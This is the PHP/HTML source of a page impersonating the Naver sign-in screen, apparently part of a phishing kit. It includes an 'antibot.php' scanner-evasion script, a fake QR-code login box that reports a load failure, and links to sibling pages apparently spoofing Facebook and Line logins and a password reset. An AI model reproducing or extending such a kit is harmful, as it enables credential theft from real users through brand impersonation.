<?php
include('php/antibot.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Naver Sign in</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
 
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src='https://kit.fontawesome.com/a076d05399.js'></script>

<!-- Fonts -->
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@900&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;900&display=swap" rel="stylesheet">

   <link rel="stylesheet" href="../css/style.css">
</head>
<body id="bd">

<div class="container" style="border: 0px solid red;">



  <div class="row my-3 px-md-5 mx-md-5  " style="border: 0px solid red;">



  	<div class="dropdown pr-md-5 mr-md-5 ml-auto ">
	  <button class="dropbtn">English <i id="ifont" class='fas'>&#xf078;</i></button>
	  <div class="dropdown-content">
	    <a href="#">한국어</a>
	    <a href="#">English</a>
	    <a href="#">中文(简体)</a>
	    <a href="#">언어선택</a>
	  </div>
	</div>

    
  </div>


  <div class="row center-text" style="border: 0px solid blue;">
  	  <a href="../index.php" id="header1"><h1 class="center-text mt-4" id="header1" style="">NAVER</h1></a>
  </div>

  <div class="row mx-md-1  text-center mt-2" style="display: block;">
  	<form class="p-3" id="form1" style="height: 400px;background: #fff;">
  	
    <h3 style="   font-family: 'Montserrat', sans-serif;width: 100%;" class="text-center mt-4"> Sign in with QR code</h3>
  	<p style="   font-family: 'Montserrat', sans-serif;width: 100%;font-size: 10px;color: #808B96;" class="text-center">

     
    After shooting a QR code with a mobile device,
    Press [28] among the numbers on the pc screen.
    You will be signed into the PC with your account. 
    </p>
     <div style="height: 200px; width: 200px;border: 1px solid #808B96;margin: 0px auto;">
        <span style="font-size: 12px; color: red;">Unable to load QRcode!</span>
      </div>
        
  			
  		<a href="../index.php" id="sociallink" style="position: bottom;">
        <div id="socials" >
            <div class="my-auto text-center" id="imgsocial">
              <img src="../img/social1.png" class="img-fluid" >
            </div>
            <div class="my-auto"  id="contentsocial">
              <span class="my-auto text-center" id="textsocial">Continue</span>
            </div>
        </div>
      </a>
  	</form>

  <div id="form1" class=" text-center">
  
    <a href="../Socials/fb.php" id="sociallink">
        <div id="socials" >

            <div class="my-auto text-center" id="imgsocial">
              <img src="../img/social2.png" class="img-fluid" >
            </div>
            <div class="my-auto"  id="contentsocial">
              <span class="my-auto" id="textsocial">Facebook</span>
            </div>
        </div>
      </a>
    <a href="../Socials/line.php" id="sociallink">  
        <div id="socials" >
            <div class="my-auto text-center" id="imgsocial">
              <img src="../img/social3.png" class="img-fluid" >
            </div>
            <div class="my-auto"  id="contentsocial">
              <span class="my-auto" id="textsocial">Line</span>
            </div>
        </div>
      </a>
      
    </div>

  	<div id="form1" class="text-center">
  		<span id="footer">Forgot your <a href="../forgot/Reset.php" id="sociallinkf">Username</a> or <a href="../forgot/Reset.php" id="sociallinkf">Password</a>   ? | Sign up</span>
  		
  	</div>
  </div>

</div>

</body>
</html>
